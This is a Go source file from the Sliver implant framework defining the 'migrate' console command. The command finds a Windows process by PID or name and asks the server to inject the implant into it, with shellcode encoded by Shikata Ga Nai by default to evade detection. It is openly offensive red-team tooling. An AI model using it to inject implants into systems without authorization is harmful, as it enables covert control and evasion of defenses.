package exec

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"strings"

	"github.com/spf13/cobra"

	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// MigrateCmd - Windows only, inject an implant into another process
func MigrateCmd(cmd *cobra.Command, con *console.SliverConsoleClient, args []string) {
	session := con.ActiveTarget.GetSession()
	if session == nil {
		return
	}

	pid, _ := cmd.Flags().GetUint32("pid")
	procName, _ := cmd.Flags().GetString("process-name")
	if pid == 0 && procName == "" {
		con.PrintErrorf("Error: Must specify either a PID or process name\n")
		return
	}
	if procName != "" {
		procCtrl := make(chan bool)
		con.SpinUntil(fmt.Sprintf("Searching for %s ...", procName), procCtrl)
		proc, err := con.Rpc.Ps(context.Background(), &sliverpb.PsReq{
			Request: con.ActiveTarget.Request(cmd),
		})
		if err != nil {
			con.PrintErrorf("Error: %v\n", err)
			return
		}
		procCtrl <- true
		<-procCtrl
		for _, p := range proc.GetProcesses() {
			if strings.EqualFold(p.Executable, procName) {
				pid = uint32(p.Pid)
				break
			}
		}
		if pid == 0 {
			con.PrintErrorf("Error: Could not find process %s\n", procName)
			return
		}
		con.PrintInfof("Process name specified, overriding PID with %d\n", pid)
	}
	config := con.GetActiveSessionConfig()
	encoder := clientpb.ShellcodeEncoder_SHIKATA_GA_NAI
	if disableSgn, _ := cmd.Flags().GetBool("disable-sgn"); disableSgn {
		encoder = clientpb.ShellcodeEncoder_NONE
	}

	ctrl := make(chan bool)
	con.SpinUntil(fmt.Sprintf("Migrating into %d ...", pid), ctrl)

	migrate, err := con.Rpc.Migrate(context.Background(), &clientpb.MigrateReq{
		Pid:     pid,
		Config:  config,
		Request: con.ActiveTarget.Request(cmd),
		Encoder: encoder,
	})
	ctrl <- true
	<-ctrl
	if err != nil {
		con.PrintErrorf("Error: %v", err)
		return
	}
	if !migrate.Success {
		con.PrintErrorf("%s\n", migrate.GetResponse().GetErr())
		return
	}
	con.PrintInfof("Successfully migrated to %d\n", pid)
}
